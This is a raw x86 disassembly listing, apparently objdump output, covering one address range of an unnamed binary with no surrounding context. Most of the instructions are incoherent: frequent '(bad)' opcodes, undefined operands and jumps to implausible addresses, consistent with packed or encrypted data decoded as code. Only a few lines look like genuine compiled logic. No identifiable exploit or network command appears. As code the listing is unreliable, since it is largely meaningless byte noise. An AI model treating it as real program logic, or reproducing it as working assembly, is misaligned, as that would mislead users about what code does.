  41a079:	sbb    esi,DWORD PTR [ebx-0x2011dd23]
  41a07f:	test   ebp,0x496a696
  41a085:	ror    BYTE PTR [edx+0x11],cl
  41a088:	adc    al,0x2c
  41a08a:	xchg   BYTE PTR [ecx],dl
  41a08c:	cwde   
  41a08d:	outs   dx,BYTE PTR ds:[esi]
  41a08e:	pushf  
  41a08f:	push   eax
  41a090:	cmp    eax,0xc2ba27f
  41a095:	mov    edi,0xc6c93240
  41a09a:	dec    esi
  41a09b:	xchg   ebp,eax
  41a09c:	xchg   DWORD PTR [ecx+0x5e600e08],edi
  41a0a2:	fstp   QWORD PTR [ecx+0x7d]
  41a0a5:	(bad)  
  41a0a6:	mov    ebp,0x254c47f5
  41a0ab:	and    eax,0x28c24d28
  41a0b0:	xlat   BYTE PTR ds:[ebx]
  41a0b1:	mov    al,0xf0
  41a0b3:	lahf   
  41a0b4:	pop    eax
  41a0b5:	daa    
  41a0b6:	lea    ecx,[edi+0x1c6ba883]
  41a0bc:	or     bl,BYTE PTR [edi+ebp*4-0x67183a5f]
  41a0c3:	inc    edi
  41a0c4:	push   esi
  41a0c5:	fsub   QWORD PTR ds:0x61252fe0
  41a0cb:	cli    
  41a0cc:	mov    al,ds:0x8fb9b4c8
  41a0d1:	icebp  
  41a0d2:	xor    eax,0x3efdbf1d
  41a0d7:	ret    0x5c71
  41a0da:	jmp    0x53aeaee9
  41a0df:	xor    ch,BYTE PTR [edi-0x6c]
  41a0e2:	mov    bh,0x81
  41a0e4:	fcmovne st,st(0)
  41a0e6:	shl    dh,1
  41a0e8:	or     eax,0x4ea6aba7
  41a0ed:	clc    
  41a0ee:	bound  ebp,QWORD PTR [eax-0x3c]
  41a0f1:	(bad)  
  41a0f2:	fsub   QWORD PTR [edi+0x1d943662]
  41a0f8:	mov    dl,0xc2
  41a0fa:	sub    eax,0xed628173
  41a0ff:	inc    esi
  41a100:	cmp    BYTE PTR [ecx],bl
  41a102:	imul   ebp,ebx,0xffffffb2
  41a105:	pop    edi
  41a106:	lds    edi,FWORD PTR [ebx+0x5fcecabb]
  41a10c:	jge    0x41a136
  41a10e:	pop    eax
  41a10f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a110:	add    BYTE PTR ds:0xa842aca6,bl
  41a116:	call   0xeffc:0x6b676831
  41a11d:	lock cmp bl,bh
  41a120:	scas   eax,DWORD PTR es:[edi]
  41a121:	mov    cl,0xaa
  41a123:	xor    ebp,DWORD PTR [ebx]
  41a125:	and    eax,0x69f68ebe
  41a12a:	sbb    esp,esp
  41a12c:	jmp    0x6647:0x5e548601
  41a133:	(bad)  [eax]
  41a135:	jbe    0x41a16e
  41a137:	inc    esi
  41a138:	retf   
  41a139:	cs jae 0x41a0f9
  41a13c:	jno    0x41a1b8
  41a13e:	aaa    
  41a13f:	data16 mov WORD PTR [esi+0x63fcb871],ds
  41a146:	sub    eax,0xad86c69
  41a14b:	xchg   DWORD PTR [esi+0x3eb54521],esp
  41a151:	mov    ecx,0x4d793bb2
  41a156:	xor    BYTE PTR [ecx],dl
  41a158:	pushf  
  41a159:	push   0xffffffb1
  41a15b:	icebp  
  41a15c:	xor    cl,dh
  41a15e:	popf   
  41a15f:	adc    bh,BYTE PTR [ebx-0x23]
  41a162:	int    0x56
  41a164:	mov    al,0x84
  41a166:	sub    eax,edx
  41a168:	int3   
  41a169:	enter  0x3318,0x75
  41a16d:	imul   ecx,DWORD PTR [edx],0x8aa031dc
  41a173:	pop    ecx
  41a174:	iret   
  41a175:	sub    DWORD PTR [esi+0x59],edx
  41a178:	mov    ch,0x86
  41a17a:	xor    BYTE PTR [edx],0x20
  41a17d:	mov    eax,0x5eb4dc50
  41a182:	test   ch,bh
  41a184:	mov    bh,0x97
  41a186:	jmp    0x10f0a6
  41a18b:	retf   
  41a18c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a18d:	and    ah,cl
  41a18f:	lahf   
  41a190:	aaa    
  41a191:	adc    BYTE PTR [eax],ch
  41a193:	dec    ebp
  41a194:	imul   edi,eax,0x1f1e6e50
  41a19a:	cli    
  41a19b:	or     bh,BYTE PTR [esi+eax*4-0x34a783e0]
  41a1a2:	aam    0x73
  41a1a4:	mov    eax,ds:0x151cc6ac
  41a1a9:	pop    edi
  41a1aa:	xor    al,0x93
  41a1ac:	push   edi
  41a1ad:	inc    ebx
  41a1ae:	adc    al,0x1f
  41a1b0:	retf   0x2abd
  41a1b3:	loope  0x41a1ce
  41a1b5:	repnz pop es
  41a1b7:	mov    ebp,0xbb8e7277
  41a1bc:	pop    ds
  41a1bd:	call   0x3d2e73ec
  41a1c2:	jmp    0x41a175
  41a1c4:	pusha  
  41a1c5:	stos   DWORD PTR es:[edi],eax
  41a1c6:	mov    ds,WORD PTR ss:[ebp+0x5f893ebd]
  41a1cd:	push   esp
  41a1ce:	inc    edi
  41a1cf:	add    ch,BYTE PTR [ebx+0x29]
  41a1d2:	cdq    
  41a1d3:	lahf   
  41a1d4:	sbb    eax,0xe83084d2
  41a1d9:	dec    ecx
  41a1da:	cmp    edx,ecx
  41a1dc:	mov    ecx,DWORD PTR [ebp-0xc]
  41a1df:	mov    DWORD PTR [ebp+0x8],ecx
  41a1e2:	mov    ecx,DWORD PTR [ebp+0x8]
  41a1e5:	je     0x420e5d
  41a1eb:	jmp    0x41c5ad
  41a1f0:	mov    ecx,DWORD PTR [ebp+0x8]
  41a1f3:	mov    edx,DWORD PTR [ebp-0x8]
  41a1f6:	jmp    0x41c583
  41a1fb:	cmp    BYTE PTR [edi-0x66],ch
  41a1fe:	ja     0x41a189
  41a200:	ja     0x41a23d
  41a202:	xchg   ebx,eax
  41a203:	xchg   esp,eax
  41a204:	sub    BYTE PTR [edi],bh
  41a206:	into   
  41a207:	mov    esp,0x6e8fe033
  41a20c:	sbb    al,0x7d
  41a20e:	jp     0x41a21a
  41a210:	pop    edi
  41a211:	jp     0x41a28d
  41a213:	xchg   ebp,eax
  41a214:	and    DWORD PTR [eax],esi
  41a216:	not    edi
  41a218:	jno    0x41a1f4
  41a21a:	xchg   esi,eax
  41a21b:	mov    BYTE PTR [esi+0x2d],dl
  41a21e:	shr    DWORD PTR [ecx+0x4404b2bd],0x70
  41a225:	push   ebx
  41a226:	xchg   esp,eax
  41a227:	int    0x15
  41a229:	test   BYTE PTR [ebx+ebp*4+0x6f],cl
  41a22d:	jne    0x41a215
  41a22f:	dec    esi
  41a230:	adc    eax,edx
  41a232:	jae    0x41a1cf
  41a234:	add    esp,0x7d
  41a237:	add    al,0xb9
  41a239:	push   ebx
  41a23a:	lds    edx,FWORD PTR [ebp+ecx*8+0x6c]
  41a23e:	jb     0x41a288
  41a240:	imul   edx,DWORD PTR [ecx-0x7f488c3c],0xe0c88e84
  41a24a:	cmc    
  41a24b:	mov    bl,0x60
  41a24d:	mov    ?,WORD PTR [esi-0x1132e450]
  41a253:	cmc    
  41a254:	and    DWORD PTR [edx+0x621dc7b5],esi
  41a25a:	or     DWORD PTR [ebp-0x4db3bd96],0x42
  41a261:	bound  ebx,QWORD PTR [edx-0x66]
  41a264:	in     eax,0xf1
  41a266:	mov    dl,0x5
  41a268:	push   ss
  41a269:	mov    ebp,ebp
  41a26b:	ins    DWORD PTR es:[edi],dx
  41a26c:	adc    cl,BYTE PTR [edx+0x7e]
  41a26f:	(bad)  [eax]
  41a271:	pop    ds
  41a272:	das    
  41a273:	push   0x54
  41a275:	test   DWORD PTR [ecx-0x48],edi
  41a278:	das    
  41a279:	sub    DWORD PTR [ecx+0x43b68b81],ecx
  41a27f:	dec    BYTE PTR [edx+0x4462b950]
  41a285:	int3   
  41a286:	mov    bh,0x2b
  41a288:	jno    0x41a29d
  41a28a:	pusha  
  41a28b:	inc    edx
  41a28c:	adc    al,0xa5
  41a28e:	push   edi
  41a28f:	jno    0x41a225
  41a291:	xchg   edi,eax
  41a292:	push   ecx
  41a293:	(bad)  
  41a294:	push   ecx
  41a295:	(bad)  
  41a296:	rcr    BYTE PTR [ecx+esi*2-0x77a15bce],1
  41a29d:	scas   al,BYTE PTR es:[edi]
  41a29e:	jp     0x41a25a
  41a2a0:	xor    esi,DWORD PTR [ebx-0x25]
  41a2a3:	(bad)
  41a2a6:	mov    gs,ebx
  41a2a8:	fnstenv [edx+0x1c]
  41a2ab:	mov    edx,0xd74fc039
  41a2b0:	ja     0x41a28d
  41a2b2:	jmp    0x41a2f8
  41a2b4:	mov    ?,WORD PTR [esi-0x49da4a2d]
  41a2ba:	pop    edi
  41a2bb:	cmp    DWORD PTR [eax+0x3f96e1ad],edi
  41a2c1:	icebp  
  41a2c2:	je     0x41a2e2
  41a2c4:	sbb    al,ah
  41a2c6:	iret   
  41a2c7:	daa    
  41a2c8:	cli    
  41a2c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2ca:	pop    ebp
  41a2cb:	scas   eax,DWORD PTR es:[edi]
  41a2cc:	popa   
  41a2cd:	sub    eax,0xdb474c19
  41a2d2:	sbb    al,0x35
  41a2d4:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a2d6:	cmp    edx,0xffffffa0
  41a2d9:	jg     0x41a32e
  41a2db:	or     DWORD PTR [eax-0x33],edi
  41a2de:	test   BYTE PTR [esi],bh
  41a2e0:	loop   0x41a2e6
  41a2e2:	cld    
  41a2e3:	adc    DWORD PTR [esi+0x49],esi
  41a2e6:	dec    ecx
  41a2e7:	loopne 0x41a355
  41a2e9:	mov    esi,0xdd56c62a
  41a2ee:	mov    al,0x4f
  41a2f0:	or     DWORD PTR [edx-0x5a],edx
  41a2f3:	inc    edi
  41a2f4:	stos   BYTE PTR es:[edi],al
  41a2f5:	push   ss
  41a2f6:	dec    ebx
  41a2f7:	inc    DWORD PTR [ecx-0x1334f656]
  41a2fd:	cmp    DWORD PTR [edx+eax*8+0x4a2c1b0f],eax
  41a304:	jecxz  0x41a37f
  41a306:	dec    eax
  41a307:	jmp    0x41a2f6
  41a309:	or     al,0xb6
  41a30b:	adc    edx,ecx
  41a30d:	fist   DWORD PTR [ebx+eiz*1]
  41a310:	or     DWORD PTR [edx+edi*8+0x1b533da8],edi
  41a317:	out    0x29,al
  41a319:	cmp    edx,DWORD PTR [ecx+eiz*4+0x6965ebef]
  41a320:	jge    0x41a39a
  41a322:	nop
  41a323:	push   eax
  41a324:	imul   esi,DWORD PTR [esi],0xbc305b60
  41a32a:	adc    eax,0x4621e19c
  41a32f:	aas    
  41a330:	ins    DWORD PTR es:[edi],dx
  41a331:	push   eax
  41a332:	stos   BYTE PTR es:[edi],al
  41a333:	repz add ebp,DWORD PTR [eax+0x3e41fd09]
  41a33a:	adc    al,0x19
  41a33c:	or     eax,0xb16aca4f
  41a341:	inc    edx
  41a342:	das    
  41a343:	jecxz  0x41a325
  41a345:	dec    esp
  41a346:	lods   eax,DWORD PTR ds:[esi]
  41a347:	pop    ebp
  41a348:	mov    ch,0x71
  41a34a:	lods   eax,DWORD PTR ds:[esi]
  41a34b:	inc    ecx
  41a34c:	sbb    ebp,esp
  41a34e:	mov    bl,0x64
  41a350:	mov    esp,0x1ff48859
  41a355:	in     al,dx
  41a356:	add    eax,0x4a2d5eac
  41a35b:	ins    BYTE PTR es:[edi],dx
  41a35c:	inc    ebx
  41a35d:	add    bl,dl
  41a35f:	fimul  DWORD PTR [edx]
  41a361:	pop    es
  41a362:	js     0x41a37f
  41a364:	aas    
  41a365:	(bad)  
  41a366:	cmp    dl,BYTE PTR [edx-0x20]
  41a369:	popa   
  41a36a:	fidiv  DWORD PTR [eax]
  41a36c:	rcr    BYTE PTR [ecx-0x292c54f9],1
  41a372:	and    DWORD PTR [ecx-0x22057524],0x27685209
  41a37c:	retf   
  41a37d:	fstp   TBYTE PTR [edi-0x7dae14ba]
  41a383:	push   cs
  41a384:	sub    BYTE PTR [ebx],cl
  41a386:	jne    0x41a3f5
  41a388:	pop    esi
  41a389:	and    edi,edx
  41a38b:	sahf   
  41a38c:	lods   al,BYTE PTR ds:[esi]
  41a38d:	lods   al,BYTE PTR ds:[esi]
  41a38e:	test   BYTE PTR [edx-0x19410371],dh
  41a394:	dec    esi
  41a395:	add    BYTE PTR [eax-0x2],dh
  41a398:	stc    
  41a399:	or     al,BYTE PTR [edi-0xda45590]
  41a39f:	jae    0x41a3e0
  41a3a1:	inc    ecx
  41a3a2:	rcl    BYTE PTR [ecx+eiz*8],0x93
  41a3a6:	(bad)  
  41a3a7:	xchg   ebp,eax
  41a3a8:	jns    0x41a39e
  41a3aa:	mov    eax,0xcf41faff
  41a3af:	push   ebx
  41a3b0:	add    eax,0x1f314ff
  41a3b5:	push   esp
  41a3b6:	lods   al,BYTE PTR ds:[esi]
  41a3b7:	cmc    
  41a3b8:	cmc    
  41a3b9:	jae    0x41a393
  41a3bb:	mov    esi,0x1c7d4b19
  41a3c0:	adc    cl,BYTE PTR [ebx+0x56]
  41a3c3:	sub    eax,0x5f8581f0
  41a3c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3c9:	or     DWORD PTR [eax+edi*1],0xd3a663a1
  41a3d0:	loopne 0x41a3a7
  41a3d2:	icebp  
  41a3d3:	or     esp,DWORD PTR [ecx]
  41a3d5:	sbb    ebx,DWORD PTR [esi]
  41a3d7:	adc    ebp,DWORD PTR [esi-0x50361c14]
  41a3dd:	outs   dx,BYTE PTR ds:[esi]
  41a3de:	ficomp DWORD PTR [edx]
  41a3e0:	clc    
  41a3e1:	stos   BYTE PTR es:[edi],al
  41a3e2:	push   ss
  41a3e3:	sbb    DWORD PTR [edx+0x18],ecx
  41a3e6:	out    dx,al
  41a3e7:	adc    BYTE PTR [esi],bh
  41a3e9:	sub    DWORD PTR [edx],edx
  41a3eb:	sti    
  41a3ec:	lea    eax,[eax+0x5343e950]
  41a3f2:	add    al,0x76
  41a3f4:	adc    BYTE PTR [ecx+esi*2+0xd],dh
  41a3f8:	sub    ebp,esp
  41a3fa:	lds    ebp,FWORD PTR [edx]
  41a3fc:	aaa    
  41a3fd:	sbb    DWORD PTR [esi+eax*1],eax
  41a400:	enter  0xb753,0x3a
  41a404:	repnz xchg ebp,eax
  41a406:	xchg   esp,eax
  41a408:	ror    DWORD PTR [ecx+0x670244fb],cl
  41a40e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a40f:	aad    0x1c
  41a411:	outs   dx,BYTE PTR ds:[esi]
  41a412:	mov    eax,ds:0xb678335c
  41a417:	add    BYTE PTR [ebp-0xd],0x3
  41a41b:	pop    eax
  41a41c:	or     BYTE PTR [ebp+0x603b7a04],ch
  41a422:	push   ebp
  41a423:	or     eax,0xc04ccf9f
  41a428:	cmc    
  41a429:	dec    eax
  41a42a:	rcl    esi,cl
  41a42c:	fist   DWORD PTR [edi]
  41a42e:	xor    BYTE PTR [ecx],ah
  41a430:	pop    esp
  41a431:	xchg   ebp,eax
  41a432:	mov    WORD PTR [esi+0xb],ds
  41a435:	and    DWORD PTR [edi-0x58],ebp
  41a438:	dec    ebp
  41a439:	sbb    al,BYTE PTR [edi-0x77]
  41a43c:	rol    DWORD PTR [ebx-0x5784ca17],cl
  41a442:	xchg   ebp,eax
  41a443:	loope  0x41a3f3
  41a445:	sbb    eax,0x374d6ca4
  41a44a:	cwde   
  41a44b:	into   
  41a44c:	push   edx
  41a44d:	or     bh,BYTE PTR [esp+ebx*4-0x4ef519f9]
  41a454:	jno    0x41a4ac
  41a456:	xchg   esi,eax
  41a457:	scas   eax,DWORD PTR es:[edi]
  41a458:	xor    cl,BYTE PTR [edx]
  41a45a:	sbb    al,0xe8
  41a45c:	cs mov dl,bh
  41a45f:	dec    eax
  41a460:	xor    al,0xa7
  41a462:	mov    edx,0x47c74624
  41a467:	test   cl,ah
  41a469:	cmp    al,0xe1
  41a46b:	adc    esi,DWORD PTR [esi]
  41a46d:	adc    BYTE PTR [edi+0x68],bl
  41a470:	adc    ebp,edi
  41a472:	std    
  41a473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a474:	and    edi,DWORD PTR [ecx]
  41a476:	les    edx,FWORD PTR [edi-0x2]
  41a479:	das    
  41a47a:	fisttp DWORD PTR [edi]
  41a47c:	dec    eax
  41a47d:	jno    0x41a4d9
  41a47f:	retf   0xb597
  41a482:	xchg   edi,eax
  41a483:	jo     0x41a422
  41a485:	add    ah,BYTE PTR [ecx-0x5872e4ac]
  41a48b:	lahf   
  41a48c:	jo     0x41a4a2
  41a48e:	cmp    DWORD PTR [esi],edi
  41a490:	sub    eax,0xd84f66cb
  41a495:	sub    al,0xed
  41a497:	dec    ebp
  41a498:	fs fs or al,0x8e
  41a49c:	inc    esp
  41a49d:	mov    bh,0x44
  41a49f:	mov    edi,eax
  41a4a1:	ja     0x41a454
  41a4a3:	push   ds
  41a4a4:	mov    esp,0x3454724
  41a4a9:	sub    DWORD PTR ds:[ecx],edx
  41a4ac:	cld    
  41a4ad:	outs   dx,BYTE PTR ds:[esi]
  41a4ae:	mov    esp,0x466ef017
  41a4b3:	lods   al,BYTE PTR ds:[esi]
  41a4b4:	sub    eax,0x50df24ae
  41a4b9:	int3   
  41a4ba:	xchg   BYTE PTR [esi-0x68],bl
  41a4bd:	fs dec ebp
  41a4bf:	mov    edx,0x803ccc2e
  41a4c4:	adc    edx,edi
  41a4c6:	lods   al,BYTE PTR ds:[esi]
  41a4c7:	sti    
  41a4c8:	rol    BYTE PTR [eax-0x6c],1
  41a4cb:	out    dx,eax
  41a4cc:	adc    eax,0x5991a0d
  41a4d1:	add    al,0x7b
  41a4d3:	lods   eax,DWORD PTR ds:[esi]
  41a4d4:	sbb    eax,DWORD PTR [ecx+0x5132efa1]
  41a4da:	jge    0x41a46d
  41a4dc:	or     eax,0xd8532a48
  41a4e1:	push   es
  41a4e2:	mov    edx,0x979741cd
  41a4e7:	sti    
  41a4e8:	adc    ecx,DWORD PTR [eax]
  41a4ea:	or     al,0x54
  41a4ec:	adc    bl,cl
  41a4ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a4ef:	pop    ebx
  41a4f0:	fidiv  WORD PTR [esi-0x277774c5]
  41a4f6:	fldcw  WORD PTR [eax]
  41a4f8:	xor    ecx,ebp
  41a4fa:	repz sbb bh,BYTE PTR [ecx+0xbadf89c]
  41a501:	pop    eax
  41a502:	mov    ecx,DWORD PTR [esi-0x2b]
  41a505:	mov    ebx,0xa995d02c
  41a50a:	xor    eax,0x341b7bba
  41a50f:	push   ebp
  41a510:	inc    ebp
  41a511:	lods   al,BYTE PTR ds:[esi]
  41a512:	push   esp
  41a513:	push   edi
  41a514:	xor    ebp,DWORD PTR [edx-0x2c]
  41a517:	mov    ds:0x8959c80b,al
  41a51c:	call   0x3495:0x46c7ee29
  41a523:	mov    ebx,0x79f798dc
  41a528:	pushf  
  41a529:	mov    dl,al
  41a52b:	call   0x36b3d883
  41a530:	adc    BYTE PTR [ebp+0xe1d1ac9],bh
  41a536:	add    dl,BYTE PTR [ebp+0x27]
  41a539:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a53a:	inc    ebx
  41a53b:	lds    esp,FWORD PTR fs:0x7183243f
  41a542:	call   0x87721a1a
  41a547:	lea    ebx,[eax]
  41a549:	addr16 int 0x21
  41a54c:	jb     0x41a51b
  41a54e:	mov    ebx,0x70b1bb1d
  41a553:	and    BYTE PTR [ebx+ebx*1],cl
  41a556:	mov    cs,WORD PTR [ebp+0x7b]
  41a559:	div    BYTE PTR [esi]
  41a55b:	push   ds
  41a55c:	xchg   esi,eax
  41a55d:	cwde   
  41a55e:	nop
  41a55f:	ret    
  41a560:	sbb    cl,BYTE PTR ds:0x4548553a
  41a566:	pop    ecx
  41a567:	dec    ecx
  41a568:	xlat   BYTE PTR ds:[ebx]
  41a569:	cs xchg edx,eax
  41a56b:	adc    DWORD PTR [edx+0x6b],0xe
  41a56f:	gs xor eax,0x1ee57d80
  41a575:	jmp    0xbe1a2ea7
  41a57a:	in     eax,0x9f
  41a57c:	test   eax,0x80629607
  41a581:	ja     0x41a530
  41a583:	mov    ebx,DWORD PTR [esi]
  41a585:	scas   al,BYTE PTR es:[edi]
  41a586:	mov    ah,0xf6
  41a588:	pop    eax
  41a589:	mov    dl,0xdb
  41a58b:	cmp    BYTE PTR [ebx],al
  41a58d:	lahf   
  41a58e:	test   al,0xf3
  41a590:	mov    ds:0x1a58c21,eax
  41a595:	pop    esp
  41a596:	shl    bh,cl
  41a598:	int    0xe2
  41a59a:	add    bh,BYTE PTR [ecx+0x19d31d09]
  41a5a0:	outs   dx,DWORD PTR ds:[esi]
  41a5a1:	call   FWORD PTR [ebx+0x33ba82e4]
  41a5a7:	call   0xd698:0xcff1e6fe
  41a5ae:	aam    0xd8
  41a5b0:	and    BYTE PTR [esp+eax*1-0x7e],bh
  41a5b4:	ss or  eax,0xa759c9d7
  41a5ba:	stos   DWORD PTR es:[edi],eax
  41a5bb:	fwait
  41a5bc:	pop    esi
  41a5bd:	sti    
  41a5be:	or     eax,DWORD PTR [eax+0xe]
  41a5c1:	cld    
  41a5c2:	ja     0x41a61e
  41a5c4:	retf   0xbda7
  41a5c7:	xor    ebx,DWORD PTR [edi]
  41a5c9:	in     eax,0x33
  41a5cb:	retf   0x65b7
  41a5ce:	aaa    
  41a5cf:	sbb    DWORD PTR [ebp-0x55],esi
  41a5d2:	fisub  DWORD PTR [ebp-0x42]
  41a5d5:	sahf   
  41a5d6:	push   ebp
  41a5d7:	add    dh,BYTE PTR [eax-0x7b3103c5]
  41a5dd:	out    dx,eax
  41a5de:	and    DWORD PTR [ecx*2-0x513c5864],0x44f68d
  41a5e9:	stc    
  41a5ea:	cmp    al,BYTE PTR [esi-0x6f]
  41a5ed:	jne    0x41a5ff
  41a5ef:	dec    esi
  41a5f0:	inc    ebp
  41a5f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a5f2:	or     BYTE PTR [edx],0x62
  41a5f5:	aaa    
  41a5f6:	icebp  
  41a5f7:	test   al,0x5b
  41a5f9:	mov    esp,0x627eea7d
  41a5fe:	mov    ch,0xac
  41a600:	jo     0x41a5c7
  41a602:	test   eax,0x627f7839
  41a607:	(bad)  
  41a608:	and    DWORD PTR [esi],ebx
  41a60a:	lea    edi,[ebx-0x6dd673a6]
  41a610:	inc    eax
  41a611:	dec    esp
  41a612:	xor    eax,0x205fb059
  41a617:	sbb    DWORD PTR [eax+0x6e],edi
  41a61a:	test   DWORD PTR [edi],0x5bc9c333
  41a620:	push   0xffffffa0
  41a622:	idiv   BYTE PTR [ebx+0x3c]
  41a625:	test   al,0x13
  41a627:	imul   eax,DWORD PTR [ebx+0x30feca77],0x5813fb21
  41a631:	inc    eax
  41a632:	or     al,0xd6
  41a634:	and    al,0x1
  41a636:	repz xchg edx,eax
  41a638:	and    ebx,DWORD PTR [esp+edx*2+0x15]
  41a63c:	pushf  
  41a63d:	test   eax,0xe5dfe236
  41a642:	loopne 0x41a65a
  41a644:	leave  
  41a645:	stos   BYTE PTR es:[edi],al
  41a646:	inc    eax
  41a647:	push   edi
  41a648:	adc    BYTE PTR [ebx],dl
  41a64a:	clc    
  41a64b:	xchg   DWORD PTR [ebx],ebp
  41a64d:	call   0x3aa16459
  41a652:	test   eax,0x40d9a189
  41a657:	adc    ah,0xa5
  41a65a:	mov    al,0xa0
  41a65c:	jbe    0x41a6bb
  41a65e:	and    edi,ebp
  41a660:	mov    gs,edi
  41a662:	and    bl,dh
  41a664:	lods   eax,DWORD PTR ds:[esi]
  41a665:	ins    DWORD PTR es:[edi],dx
  41a666:	or     al,0xc2
  41a668:	cmp    al,0x19
  41a66a:	(bad)  
  41a66b:	in     al,dx
  41a66c:	pop    esi
  41a66d:	sub    dl,0x1a
  41a670:	and    DWORD PTR gs:[ecx+edx*4+0x51],edx
  41a675:	imul   esp,DWORD PTR ds:0x1fe95ca1,0x968b018f
  41a67f:	jno    0x41a6d8
  41a681:	sub    al,BYTE PTR [edx+esi*1]
  41a684:	xchg   edx,eax
  41a685:	imul   esi,DWORD PTR ds:0x94d14e98,0x65
  41a68c:	in     al,0x7a
  41a68e:	(bad)  
  41a68f:	shr    DWORD PTR [ecx+0x63db22dd],1
  41a695:	and    DWORD PTR [ebx+0x1ed510da],esi
  41a69b:	lods   eax,DWORD PTR ds:[esi]
  41a69c:	cdq    
  41a69d:	adc    dh,BYTE PTR [eax+0x27be1e5e]
  41a6a3:	mov    cl,0x8b
  41a6a5:	retf   
  41a6a6:	add    DWORD PTR [esi],ecx
  41a6a8:	jb     0x41a655
  41a6aa:	dec    ebp
  41a6ab:	xchg   ebp,eax
  41a6ac:	ins    BYTE PTR es:[edi],dx
  41a6ad:	jno    0x41a6a4
  41a6af:	mov    al,0x9
  41a6b1:	pushf  
  41a6b2:	aam    0x1a
  41a6b4:	(bad)  
  41a6b5:	es sbb cl,ah
  41a6b8:	adc    DWORD PTR [esi+0x5c],esi
  41a6bb:	xchg   DWORD PTR [edi],esp
  41a6bd:	in     eax,dx
  41a6be:	int3   
  41a6bf:	pop    ds
  41a6c0:	jge    0x41a662
  41a6c2:	xor    DWORD PTR [eax-0x15],ebp
  41a6c5:	xor    edi,esi
  41a6c7:	jmp    0xe5d29687
  41a6cc:	cld    
  41a6cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6ce:	push   ebx
  41a6cf:	sahf   
  41a6d0:	in     al,dx
  41a6d1:	shl    BYTE PTR [esp+edx*4+0x10],cl
  41a6d5:	(bad)  
  41a6d6:	push   esp
  41a6d7:	sbb    esi,DWORD PTR [ecx]
  41a6d9:	xor    edx,0x3f
  41a6dc:	sbb    eax,0x1346b947
  41a6e1:	sbb    eax,DWORD PTR [edx]
  41a6e3:	jmp    0x2a76:0x17cba90d
  41a6ea:	inc    esi
  41a6eb:	push   ebx
  41a6ec:	popa   
  41a6ed:	hlt    
  41a6ee:	mov    ah,0x9b
  41a6f0:	xor    bh,BYTE PTR [edx-0x32]
  41a6f3:	jo     0x41a69d
  41a6f5:	cmp    bl,BYTE PTR [ebp+0x5b]
  41a6f8:	sbb    esi,ebx
  41a6fa:	pop    esi
  41a6fb:	pop    eax
  41a6fc:	sbb    dh,BYTE PTR [ebx]
  41a6fe:	pop    ss
  41a6ff:	ins    DWORD PTR es:[edi],dx
  41a700:	lea    eax,[eax+0x73305817]
  41a706:	mov    ebp,0xe0a1526c
  41a70b:	outs   dx,BYTE PTR ds:[esi]
  41a70d:	push   esi
  41a70e:	cli    
  41a70f:	inc    edx
  41a710:	rcr    BYTE PTR [ecx+0x4b517647],0xa9
  41a717:	jmp    0x41a725
  41a719:	mov    esp,DWORD PTR [ebp+0x39]
  41a71c:	int    0x99
  41a71e:	sub    eax,0xf6147035
  41a723:	jns    0x41a6ad
  41a725:	mov    bh,0x5f
  41a727:	xor    DWORD PTR fs:[ecx],esi
  41a72a:	out    0x87,eax
  41a72c:	imul   esi,DWORD PTR [edx+0x35],0xf61a2499
  41a733:	dec    ecx
  41a734:	mov    BYTE PTR [eax],cl
  41a736:	mov    ebx,0x37ebbb5b
  41a73b:	dec    edi
  41a73c:	push   ss
  41a73d:	inc    ebx
  41a73e:	mov    cl,0x83
  41a740:	cmp    dl,BYTE PTR [ecx-0x115983b6]
  41a746:	cld    
  41a747:	lods   al,BYTE PTR ds:[esi]
  41a748:	mov    cl,0x58
  41a74a:	mov    eax,0x8ac62dbc
  41a74f:	cmp    ah,BYTE PTR [eax+0x5b1edd3d]
  41a755:	mov    ebx,0x88a3eb6
  41a75a:	pop    esp
  41a75b:	leave  
  41a75c:	cmc    
  41a75d:	mov    ?,WORD PTR [edi+0x18]
  41a760:	dec    ecx
  41a761:	sub    cl,cl
  41a763:	mov    ebp,0xddb5a370
  41a768:	aam    0x70
  41a76a:	sar    BYTE PTR [ebp+0x77],0x83
  41a76e:	and    esi,edx
  41a770:	sbb    ecx,DWORD PTR [ebx-0x16]
  41a773:	sbb    bl,BYTE PTR [ebp-0x23]
  41a776:	repnz cmc 
  41a778:	mov    al,ds:0xe30f86f1
  41a77d:	or     DWORD PTR [ebx+0x57],edi
  41a780:	xor    bl,dh
  41a782:	aas    
  41a783:	rcr    DWORD PTR [esi],cl
  41a785:	out    0x0,al
  41a787:	(bad)  
  41a788:	dec    esp
  41a789:	es mov al,0xdd
  41a78c:	hlt    
  41a78d:	pop    es
  41a78e:	mov    esp,0xc52be619
  41a793:	fwait
  41a794:	iret   
  41a795:	pushf  
  41a796:	popf   
  41a797:	data16 (bad) 
  41a799:	inc    BYTE PTR [eax-0x5f36fe8b]
  41a79f:	or     edx,eax
  41a7a1:	cwde   
  41a7a2:	stos   BYTE PTR es:[edi],al
  41a7a3:	ss loope 0x41a767
  41a7a6:	mov    ah,BYTE PTR [ecx+ebp*4+0xd62ed84]
  41a7ad:	jmp    0x41a81f
  41a7af:	ja     0x41a80c
  41a7b1:	not    DWORD PTR [edi+0x6]
  41a7b4:	pop    ebp
  41a7b5:	mov    ah,0x23
  41a7b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a7b8:	push   cs
  41a7b9:	in     eax,0x25
  41a7bb:	mov    WORD PTR [eax-0x2d],cs
  41a7be:	mov    bl,0xb4
  41a7c0:	sbb    esp,DWORD PTR [edx-0x2826459b]
  41a7c6:	ret    0x792c
  41a7c9:	dec    ebx
  41a7ca:	jmp    0x9ead:0xb18f4d8c
  41a7d1:	sahf   
  41a7d2:	fs cwde 
  41a7d4:	mov    esp,0x94b8a7b4
  41a7d9:	sbb    DWORD PTR [esi],edx
  41a7db:	push   eax
  41a7dc:	xchg   edx,eax
  41a7dd:	aam    0xa1
  41a7df:	mov    edi,?
  41a7e1:	xor    al,0xf5
